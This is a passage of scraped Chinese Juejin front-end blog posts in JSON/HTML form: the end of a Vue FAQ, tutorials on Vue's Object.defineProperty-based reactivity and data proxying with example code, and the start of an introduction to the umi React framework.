href=\"https://link.juejin.im?target=https%3A%2F%2Fwepyjs.github.io%2Fwepy%2F%23%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">wepy</a></p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-67\">Q:想要 mock 数据,直接请求 <strong>json文件</strong> 为什么不行!</h2><p>当然不行,浏览器安全机制不允许,JS天生不能越权(NodeJS不能单纯说是JS)</p>\n<p>你要 mock 数据,一般都有比较成熟的方案...传送门:</p>\n<ul>\n<li><a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fnuysoft%2FMock\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Mock</a></li>\n<li><a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Feasy-mock%2Feasy-mock\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Easy Mock</a></li>\n</ul>\n<hr>\n<h1 class=\"heading\" data-id=\"heading-68\">Vue 周边库汇总</h1><p><a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fvuejs%2Fawesome-vue\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><strong>Awesome Vue</strong></a> : 里面收集了 Vue 方方面面的热门库!!</p>\n<hr>\n<h1 class=\"heading\" data-id=\"heading-69\">Vue 最近的动态</h1><ul>\n<li>据说 Vue 3 打算用<code>Proxy</code>拦截器来做数据拦截及响应..这样可以检测到更多数据类型的响应;不过 IE系列全军覆没,<code>polyfill</code> 都不行</li>\n<li>Vue 目前最新 2.5.3 核心库已适配 <code>typescript 2.6</code>; 但是周边库没跟上(比如第三方的 UI 框架,没有更新对应的 <code>d.ts</code>编译器会报错)..若是组件基本都是自己去写,用 <code>ts+vue</code>开发已经没什么特别的坑了...</li>\n</ul>\n<hr>\n<h1 class=\"heading\" data-id=\"heading-70\">结语</h1><p>问题就汇总了这么多...还有一些以前看到了.但是忘记了..想不起来了...后续有看到再补上.</p>\n<p>小伙伴们也可以留言补充,我会及时跟进....</p>\n<p>不过现在的新人好浮躁,一言不合就做伸手党...不愿花时间去折腾.无解.....</p>\n<p>希望该篇文章可以帮到一些小伙伴节省时间，加快开发。</p>\n<p></p><figure><img alt=\"\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/9/17/43d50d8fc75062e0abb632393d4cc579?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>最后送上一张我群里的提问图...!!!!</p>\n<p><strong>调试是不可能调试的，只能靠群聊天解决bug这个样子。超喜欢这个群，群里的人，又厉害说话又好听,O(∩_∩)O~</strong></p>\n<p></p><figure><img alt=\"\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/29/1600700013f42a39?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"1280\" data-height=\"991\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;1280&quot; height=&quot;991&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n</div>"},{"title":"Vue响应式----数据响应式原理","avatar":"https://user-gold-cdn.xitu.io/2017/9/21/db0f1690a902b6ae6ca412c309c81644?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"王兴欣","create_time":"2017 年 11 月 20 日","tags":["Vue.js","JavaScript","前端"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><h3 class=\"heading\" data-id=\"heading-0\">前言</h3><p>Vue的数据响应主要是依赖了<code>Object.defineProperty()</code>，那么整个过程是怎么样的呢？以我们自己的想法来走Vue的道路，其实也就是以Vue的原理为终点，我们来逆推一下实现过程。</p>\n<blockquote>\n<p>本文代码皆为低配版本，很多地方都不严谨，比如 <code>if(typeof obj === 'object')</code>这是在判断<code>obj</code>是否为为一个对象，虽然<code>obj</code>也有可能是数组等其他类型的数据，但是本文为了简便，就直接这样写来表示判断对象，对于数组使用<code>Array.isArray()</code>。</p>\n</blockquote>\n<h3 class=\"heading\" data-id=\"heading-1\">改造数据</h3><p>我们先来尝试写一个函数，用于改造对象：</p>\n<blockquote>\n<p>为什么要先写这个函数呢？ 因为改造数据是一个最基础也是最重要的步骤,之后所有的步骤都会依赖这一步。</p>\n</blockquote>\n<pre><code class=\"hljs javascript\" lang=\"JavaScript\"><span class=\"hljs-comment\">// 代码 1.1</span>\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">defineReactive</span> (<span class=\"hljs-params\">obj,key,val</span>) </span>{\n    <span class=\"hljs-built_in\">Object</span>.defineProperty(obj,key,{\n        <span class=\"hljs-attr\">enumerable</span>: <span class=\"hljs-literal\">true</span>,\n        <span class=\"hljs-attr\">configurable</span>: <span class=\"hljs-literal\">true</span>,\n        <span class=\"hljs-attr\">get</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{\n            <span class=\"hljs-keyword\">return</span> val;\n        },\n        <span class=\"hljs-attr\">set</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">newVal</span>) </span>{\n            <span class=\"hljs-comment\">//判断新值与旧值是否相等</span>\n            <span class=\"hljs-comment\">//判断的后半段是为了验证新值与旧值都为NaN的情况  NaN不等于自身</span>\n            <span class=\"hljs-keyword\">if</span>(newVal === val || (newVal !== newVal &amp;&amp; value !== value)){\n                <span class=\"hljs-keyword\">return</span> ;\n            }\n            val = newVal;\n        }\n    });\n}</code></pre><p>例如<code>const obj = {}</code>,然后再调用<code>defineReactive(obj,'a',2)</code>方法，此时在函数内，<code>val=2</code>，然后每次获取<code>obj.a</code>的值的时候都是获取<code>val</code>的值，设置<code>obj.a</code>的时候也是设置<code>val</code>的值。（每次调用<code>defineReactive</code>都会产生一个闭包保存了<code>val</code>的值）;</p>\n<h3 class=\"heading\" data-id=\"heading-2\">流程讨论</h3><p>经过验证之后，发现这个函数确实可以使用的。然后我们来讨论一下响应的流程：</p>\n<p></p><figure><img alt=\"\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/17/15fc826af0c5bd33?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"459\" data-height=\"209\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;459&quot; height=&quot;209&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<ol>\n<li>输入数据</li>\n<li>改造数据（<code>defineReactive()</code>）</li>\n<li>如果数据变动 =&gt; 触发事件</li>\n</ol>\n<p>我们来看第三步，数据变动如何触发之后的事件呢？仔细思考一下，如果要改变数据，那么必须先<code>set</code>数据，那么我们直接<code>set()</code>里面添加方法就ok了呀。</p>\n<p>然后还有一个重要问题：</p>\n<p></p><figure><img alt=\"\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/17/15fc82db9bbbf6e0?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"475\" data-height=\"219\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;475&quot; height=&quot;219&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<h3 class=\"heading\" data-id=\"heading-3\">依赖收集</h3><p>我们怎么知道数据改变之后要触发的是什么事件呢？在Vue中：</p>\n<p>使用数据 =&gt; 视图； 使用了数据来渲染视图，那么在获取数据的时候收集依赖是最佳的时机，Vue在改造数据属性的时候生成一个<code>Dep</code>实例，用于收集依赖。</p>\n<pre><code class=\"hljs javascript\" lang=\"JavaScript\"><span class=\"hljs-comment\">// 代码 1.2</span>\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Dep</span> </span>{\n    <span class=\"hljs-keyword\">constructor</span>(){\n        <span class=\"hljs-comment\">//订阅的信息</span>\n        <span class=\"hljs-keyword\">this</span>.subs = [];\n    }\n\n    addSub(sub){\n        <span class=\"hljs-keyword\">this</span>.subs.push(sub);\n    }\n\n    removeSub (sub) {\n        remove(<span class=\"hljs-keyword\">this</span>.subs, sub);\n    }\n\n    <span class=\"hljs-comment\">//此方法的作用等同于 this.subs.push(Watcher);</span>\n    depend(){\n        <span class=\"hljs-keyword\">if</span> (Dep.target) {\n            Dep.target.addDep(<span class=\"hljs-keyword\">this</span>);\n        }\n    }\n    <span class=\"hljs-comment\">//这个方法就是发布通知了 告诉你 有改变啦</span>\n    notify(){\n        <span class=\"hljs-keyword\">const</span> subs = <span class=\"hljs-keyword\">this</span>.subs.slice()\n        <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>, l = subs.length; i &lt; l; i++) {\n          subs[i].update();\n        }\n    }\n}\nDep.target = <span class=\"hljs-literal\">null</span>;</code></pre><p>代码1.2就是<code>Dep</code>的部分代码，暂时只需要知道2个方法的作用就可以了</p>\n<ul>\n<li><code>depend()</code> --- 可以理解为收集依赖的事件，不考虑其他方面的话 功能等同于<code>addSub()</code></li>\n<li><code>notify()</code> --- 这个方法更为直观了，执行所有依赖的<code>update()</code>方法。就是之后的改变视图啊 等等。</li>\n</ul>\n<blockquote>\n<p>本篇主要讨论数据响应的过程，不深入讨论 <code>Watcher</code>类，所以<code>Dep</code>中的方法知道作用就可以了。</p>\n</blockquote>\n<p>然后就是改变代码1.1了</p>\n<pre><code class=\"hljs javascript\" lang=\"JavaScript\"><span class=\"hljs-comment\">//代码 1.3</span>\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">defineReactive</span> (<span class=\"hljs-params\">obj,key,val</span>) </span>{\n    <span class=\"hljs-keyword\">const</span> dep = <span class=\"hljs-keyword\">new</span> Dep();\n\n    <span class=\"hljs-built_in\">Object</span>.defineProperty(obj,key,{\n        <span class=\"hljs-attr\">enumerable</span>: <span class=\"hljs-literal\">true</span>,\n        <span class=\"hljs-attr\">configurable</span>: <span class=\"hljs-literal\">true</span>,\n        <span class=\"hljs-attr\">get</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{\n            <span class=\"hljs-keyword\">if</span>(Dep.target){\n                <span class=\"hljs-comment\">//收集依赖 等同于  dep.addSub(Dep.target)</span>\n                dep.depend()\n            }\n            <span class=\"hljs-keyword\">return</span> val;\n        },\n        <span class=\"hljs-attr\">set</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">newVal</span>) </span>{\n            <span class=\"hljs-keyword\">if</span>(newVal === val || (newVal !== newVal &amp;&amp; val !== val)){\n                <span class=\"hljs-keyword\">return</span> ;\n            }\n            val = newVal;\n            <span class=\"hljs-comment\">//发布改变</span>\n            dep.notify();\n        }\n    });\n}</code></pre><p>这代码中有一个疑点，<code>Dep.target</code>是什么？为什么要有<code>Dep.target</code>才会收集依赖呢？</p>\n<ol>\n<li><code>Dep</code>是一个类，<code>Dep.target</code>是类的属性，并不是<code>dep</code>实例的属性。</li>\n<li><code>Dep</code>类在全局可用，所以<code>Dep.target</code>在全局能访问到，可以任意改变它的值。</li>\n<li><code>get</code>这个方法使用很平常，不可能每次使用获取数据值的时候都去调用<code>dep.depend()</code>。</li>\n<li><code>dep.depend()</code>实际上就是<code>dep.addSub(Dep.target)</code>。</li>\n<li>那么最好方法就是，在使用之前把<code>Dep.target</code>设置成某个对象，在订阅完成之后设置<code>Dep.target = null</code>。</li>\n</ol>\n<h3 class=\"heading\" data-id=\"heading-4\">验证</h3><p>是时候来验证一波代码的可用性了</p>\n<pre><code class=\"hljs javascript\" lang=\"JavaScript\"><span class=\"hljs-comment\">//代码 1.4</span>\n\n<span class=\"hljs-keyword\">const</span> obj = {};<span class=\"hljs-comment\">//这一句是不是感觉很熟悉  就相当于初始化vue的data ---- data:{obj:{}};</span>\n\n<span class=\"hljs-comment\">//低配的不能再低配的watcher对象（源码中是一个类，我这用一个对象代替了）</span>\n<span class=\"hljs-keyword\">const</span> watcher = {\n    <span class=\"hljs-attr\">addDep</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">dep</span>) </span>{\n        dep.addSub(<span class=\"hljs-keyword\">this</span>);\n    },\n    <span class=\"hljs-attr\">update</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{\n        html();\n    }\n}\n<span class=\"hljs-comment\">//假装这个是渲染页面的</span>\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">html</span> (<span class=\"hljs-params\"></span>) </span>{\n    <span class=\"hljs-built_in\">document</span>.querySelector(<span class=\"hljs-string\">'body'</span>).innerHTML = obj.html;\n}\ndefineReactive(obj,<span class=\"hljs-string\">'html'</span>,<span class=\"hljs-string\">'how are you'</span>);<span class=\"hljs-comment\">//定义响应式的数据</span>\n\nDep.target = watcher;\nhtml();<span class=\"hljs-comment\">//第一次渲染界面</span>\nDep.target = <span class=\"hljs-literal\">null</span>;</code></pre><p>此时浏览器上的界面是这样的</p>\n<p></p><figure><img alt=\"\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/17/15fc8db39f6f7623?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"475\" data-height=\"147\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;475&quot; height=&quot;147&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>然后在下打开了控制台开始调试，输入：</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">obj.html = <span class=\"hljs-string\">'I am fine thank you'</span></code></pre><p>然后就发现，按下回车的那一瞬间，奇迹发生了，页面变成了</p>\n<p></p><figure><img alt=\"\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/17/15fc8e41ec10317f?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"250\" data-height=\"75\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;250&quot; height=&quot;75&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<h3 class=\"heading\" data-id=\"heading-5\">结尾</h3><p>Vue数据响应的设计模式和订阅发布模式有一点像，但是不同，每一个<code>dep</code>实例就是一个订阅中心，每一次发布都会把所有的订阅全部发布出去。<br>Vue的响应式原理其实还有很大一部分，本文主要讨论了Vue是如何让数据进行响应，但是实际上，一般的数据都是很多的，一个数据被多处使用，改变数据之后观察新值，如何观察、如何订阅、如何调度，都还有很大一部分没有讨论。主要的三个类<code>Dep</code>（收集依赖）、<code>Observer</code>（观察数据）、<code>Watcher</code>（订阅者，若数据有变化通知订阅者），都只提了一点点。</p>\n<p>之前写有一篇<a href=\"https://link.juejin.im?target=https%3A%2F%2Fjuejin.im%2Fpost%2F5a04231af265da431f4a84be\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Vue响应式----数组变异方法</a>，针对Vue中对数组的改造进行讨论。当然之后有更多其他的文章，整个数据响应流程还有很多内容，三个主要的类都还没有讨论完。</p>\n<p>其实阅读源码不仅仅是为了知道源码是如何工作的，更重要的是学习作者的思路与方法，我写的文章都不长，希望自己能够每次专注一个点，能够真真实实领悟到这一个点的原理。当然也想控制阅读时间，免得大家看到一半就关闭了。</p>\n</div>"},{"title":"Vue中学到的功夫，隔山打牛大法","avatar":"https://user-gold-cdn.xitu.io/2017/9/21/db0f1690a902b6ae6ca412c309c81644?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"王兴欣","create_time":"2018 年 01 月 31 日","tags":["Vue.js","前端"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><h3 class=\"heading\" data-id=\"heading-0\">疑问</h3>\n<p>在初学Vue的时候，我发现了一个神奇的事情，在props和data里的属性、methods里面的方法，居然能够通过<code>this.xx</code>直接使用。</p>\n<pre><code class=\"hljs javascript\" lang=\"javascript\"><span class=\"hljs-keyword\">new</span> Vue({\n   <span class=\"hljs-attr\">data</span>:{\n       <span class=\"hljs-attr\">words</span>:<span class=\"hljs-string\">'hello'</span>\n   },\n   created(){\n       <span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-keyword\">this</span>.words); <span class=\"hljs-comment\">//居然可以打印出hello来</span>\n   }\n});\n</code></pre><p>这特么是一种武功？在下第一个不服，打算一探究竟。\n</p><figure><img class=\"lazyload inited loaded\" data-src=\"https://user-gold-cdn.xitu.io/2018/1/30/16146664510fa9b4?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"161\" data-height=\"159\" src=\"https://user-gold-cdn.xitu.io/2018/1/30/16146664510fa9b4?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\"><figcaption></figcaption></figure><p></p>\n<h3 class=\"heading\" data-id=\"heading-1\">偷师学艺</h3>\n<p>熟话说，知己知彼才能百战不殆，待在下偷看一下Vue的武功秘籍，想好对策，再去上门踢馆。然后当上总经理，出任CEO，迎娶白富美，走上人生的巅峰。</p>\n<blockquote>\n<p><code>Object.defineProperty</code> 是Vue中重要的组成部分，不了解的童鞋先查看一下文档，<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fuser-gold-cdn.xitu.io%2F2018%2F1%2F30%2F16146c9c180b7ffc\" rel=\"nofollow noopener noreferrer\">Object.defineProperty()</a>。</p>\n</blockquote>\n<p>我把这一招称作隔山打牛大法，果然是奇妙无穷，在下偷学了他的武功心法，为了让更多的人学会这一招，在下演练一下低配版的隔山打牛。</p>\n<pre><code class=\"hljs javascript\" lang=\"javascript\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">proxy</span> (<span class=\"hljs-params\">target, source</span>)</span>{\n    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-keyword\">let</span> key <span class=\"hljs-keyword\">in</span> source){\n        <span class=\"hljs-built_in\">Object</span>.defineProperty(target,key,{\n            <span class=\"hljs-attr\">enumerable</span>: <span class=\"hljs-literal\">true</span>,\n            <span class=\"hljs-attr\">configurable</span>: <span class=\"hljs-literal\">true</span>,\n            <span class=\"hljs-attr\">get</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>{\n                <span class=\"hljs-keyword\">return</span> source[key];\n            },\n            <span class=\"hljs-attr\">set</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">val</span>) </span>{\n                source[key] = val;\n            }\n    \t});\n    }\n}\n<span class=\"hljs-keyword\">const</span> father = {};\n<span class=\"hljs-keyword\">const</span> child = {\n    <span class=\"hljs-attr\">money</span>:<span class=\"hljs-number\">100</span>\n}\nproxy(father, child);\n\nfather.money <span class=\"hljs-comment\">// 100</span>\n</code></pre><p>招式其实很简单，在调用<code>proxy</code>方法之后，每次去获取<code>father</code>的<code>money</code>的时候，<code>return</code>的是<code>child</code>的<code>money</code>，设置的时候也是这样的。</p>\n<h3 class=\"heading\" data-id=\"heading-2\">拓展</h3>\n<p><code>Vue</code>中的<code>Props、data、methods</code>都是使用的这一招定义到<code>vm</code>上的。那么在组件中，<code>data</code>必须使用函数和这货有没有关系呢？</p>\n<p></p><figure><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/1/30/16146e8d92f56950?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"710\" data-height=\"328\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;710&quot; height=&quot;328&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>其实并没有什么关系，但是我们可以通过<code>proxy</code>反推。</p>\n<p>在构建组件实例的时候会传入<code>option</code>，里面有一系列的属性与方法。</p>\n<pre><code class=\"hljs javascript\" lang=\"javascript\">Vue.component(<span class=\"hljs-string\">'my-component'</span>,{\n    <span class=\"hljs-attr\">template</span>:<span class=\"hljs-string\">'&lt;span&gt;{{ message }}&lt;/span&gt;'</span> ,\n    <span class=\"hljs-attr\">data</span>:{\n        <span class=\"hljs-attr\">message</span>:<span class=\"hljs-string\">'hello'</span>\n    }\n});\n</code></pre><p>每次实例化组件的时候，都会使用这个引用地址相同的<code>data</code>来传入<code>proxy</code>中。那么虽然有多个实例，但实际上隔山打的都是同一个牛。</p>\n<p>如果<code>data</code>是一个函数，那么就会执行函数，返回一个新的<code>data</code>对象，这样隔山打牛就是不同的牛了。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">data = vm._data = typeof data === <span class=\"hljs-string\">'function'</span> ? getData(data, vm) : data || {}\n</code></pre><h3 class=\"heading\" data-id=\"heading-3\">登门踢馆</h3>\n<p></p><figure><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/1/30/16146f485bf4c82a?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"240\" data-height=\"240\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;240&quot; height=&quot;240&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure>\n在下也学会了隔山打牛，<code>Vue</code>你就等死吧。（当上总经理，出任CEO，迎娶白富美，走上人生的巅峰。）<p></p>\n<p>Vue：？？？</p>\n<p></p><figure><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/1/30/16146f87b5f38bdf?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"240\" data-height=\"237\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;240&quot; height=&quot;237&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>Vue：隔山打牛只是<code>Object.defineProperty</code>用法的一种，虽然你知道了可以直接用<code>this.xx</code>来访问属性与方法，但是你知道我是如何做到响应式的吗？你个辣鸡。</p>\n<p>Vue：来吧，在下不动，让你三招。</p>\n<p>我：（怎么办，不是对手啊，慌的一批）</p>\n<p></p><figure><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/1/30/161470016d9ac1b7?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"323\" data-height=\"311\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;323&quot; height=&quot;311&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>我：我媳妇昨天出门做头发回来了，这次在下就放你一马。（跑跑跑）</p>\n<hr>\n<p>哎，居然不是对手，还是继续回去修习吧。\n我还是去修习那啥，他说的那个啥，<code>Vue</code>的响应式原力？？？</p>\n<p><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fjuejin.im%2Fpost%2F5a0e53965188254dd935f850\" rel=\"nofollow noopener noreferrer\">Vue响应式----数据响应式原理</a>。</p>\n</div>"},{"title":"Hello！umi","avatar":"https://avatars.githubusercontent.com/u/35128?v=3","author":"云谦","create_time":"2018 年 01 月 31 日","tags":["React.js","前端","服务器","Preact"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><p><strong>一、</strong></p>\n<p><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fumijs%2Fumi\" rel=\"nofollow noopener noreferrer\">umi</a>（中文名：五米）是我目前的工作重点，正在全力开发中，从写下第一行代码开始算起已有数月。但从闲聊和邮件中发现不少人还不能准备地理解 umi 是啥、能做啥，于是趁着代码写累了，聊聊 umi 的一些情况。</p>\n<img height=\"120\" width=\"120\" class=\"lazyload inited loaded\" data-src=\"https://user-gold-cdn.xitu.io/2018/1/31/1614a2c3df4f8a0c?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"470\" data-height=\"470\" src=\"https://user-gold-cdn.xitu.io/2018/1/31/1614a2c3df4f8a0c?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\">\n<p>umi 是工具吗？是。但不仅仅是。<strong>我给 umi 的定位是开发框架，目前包含工具 + 路由，不包含数据和视图。</strong> 所以 umi[工具 + 路由] + dva[数据] + antd(-mobile)[视图]，很配哦。另外，umi 目前基于 React，不支持 Vue 和其他框架或者无框架的开发方式。</p>\n<p>前面说的目前，其实是精力有限。</p>\n<p>&nbsp;</p>\n<p><strong>二、</strong></p>\n<p>大家可能会觉得，umi 有啥特别的，工具用 webpack + webpack-dev-server + babel + postcss + ... ，路由用 react-router 不就完了吗？</p>\n<p>这是上一代的使用方式，工具是工具，库是库，泾渭分明。<strong>而近来，我们发现工具和库其实可以糅合在一起，工具也是框架的一部分。</strong> 通过约定、自动生成和解析代码等方式来辅助开发，减少开发者要写的代码量。next.js 如此，umi 也如此，<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Ftomdale.net%2F2017%2F09%2Fcompilers-are-the-new-frameworks%2F\" rel=\"nofollow noopener noreferrer\">Compilers are the New Frameworks</a> 。</p>\n<p>&nbsp;</p>\n<p><strong>三、</strong></p>\n<p>那么，为啥要把路由层做进去？</p>\n<p>路由即页面，而页面是构成应用的单位。接管了路由层，意味着更多的可能性，可以管控每个页面的生成、切换、销毁等。框架能做的事情多了，才更有存在的意义。</p>\n<p>比如：</p>\n<ul>\n<li>一键切换单页多页</li>\n<li>运行时按需加载</li>\n<li>开发时按需编译</li>\n<li>静态 HTML 的生成</li>\n<li>...</li>\n</ul>\n<p>&nbsp;</p>\n<p><strong>四、</strong></p>\n<p>所以，umi 有啥？我为什么要用？</p>\n<p>简单来说，有以下 4 点：</p>\n<ul>\n<li>🗃 开箱即用</li>\n<li>🚀 极快</li>\n<li>⚔️ 多端</li>\n<li>😊 开发友好</li>\n</ul>\n<p>（没了？🏃🏃🏃 先别走，听我细细道来。。）</p>\n<p>&nbsp;</p>\n<p><strong>五、</strong></p>\n<p>开箱即用？那么箱子里有啥？</p>\n<p>我们来对比下，以 roadhog 初始化一个项目为例。</p>\n<p>roadhog：</p>\n<ol>\n<li>安装构建工具依赖 roadhog</li>\n<li>安装类库依赖，有 antd/antd-mobile、react + react-dom (或者 preact + preact-compat) 依赖</li>\n<li>如果是 preact 项目，需要配 alias</li>\n<li>如果需要路由，还需要安装 react-router</li>\n<li>安装 babel 插件 babel-plugin-import，并按文档配置，但可能配出错（此块咨询非常多）</li>\n<li>配置 webpack entry，打包多页</li>\n</ol>\n<p>umi:</p>\n<ol>\n<li>安装依赖 umi</li>\n</ol>\n<p><strong>只需一步，剩下的都不用做，因为在 umi 这个箱子里了。</strong> 不过很多东西虽然已经在了，但仍保留让用户选择的权利，比如选择 preact 还是 react，比如 antd(-mobile) 的版本，eslint 规则可覆盖可 merge 等等。</p>\n<p>&nbsp;</p>\n<p><strong>六、</strong></p>\n<p>umi 在性能上做了很多努力，这些对于开发者是无感知的。<strong>“你只管写业务代码，我会负责性能”，并且随着 umi 的迭代，我保证你的应用会越来越快。</strong></p>\n<p>主要有：</p>\n<ul>\n<li>PWA Support</li>\n<li>Tree Shake</li>\n<li>antd(-mobile) 启用 ES Module</li>\n<li>Scope Hoist</li>\n<li>公共文件的智能提取</li>\n<li>页面级的按需加载</li>\n<li>Inline Critical CSS</li>\n<li>提供 <code>umi/dynamic</code> 和 <code>import()</code> 语法，分别用于懒加载组件和模块</li>\n<li>优化的 <a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fumijs%2Fumi%2Ftree%2Fmaster%2Fpackages%2Fbabel-preset-umi\" rel=\"nofollow noopener noreferrer\">babel-preset-umi</a></li>\n<li>静态化的 SSR 处理</li>\n<li>link rel=preload</li>\n<li>hash 构建及服务端支持（云凤蝶）</li>\n<li>通过 react-constant-elements 和 react-inline-elements 提升 rerender 性能</li>\n<li>一键切换到 preact</li>\n<li>Progressive image loading</li>\n<li>按需打包 umi 内置的路由代码</li>\n<li>...</li>\n</ul>\n<p>优化点很多，有些关乎尺寸，有些关乎执行效率，有些关乎首屏时间，有些关乎用户体验，细聊的话，能说上几个小时。大家根据关键字应该能猜个大概，这里就不展开了。</p>\n<p>&nbsp;</p>\n<p><strong>七、</strong></p>\n<p>umi 就是为多端而生的，这里的多端指的是 web + 各种容器，比如说我们需要同时把代码部署到支付宝钱包的离线包和在线服务器。</p>\n<p>因为 umi 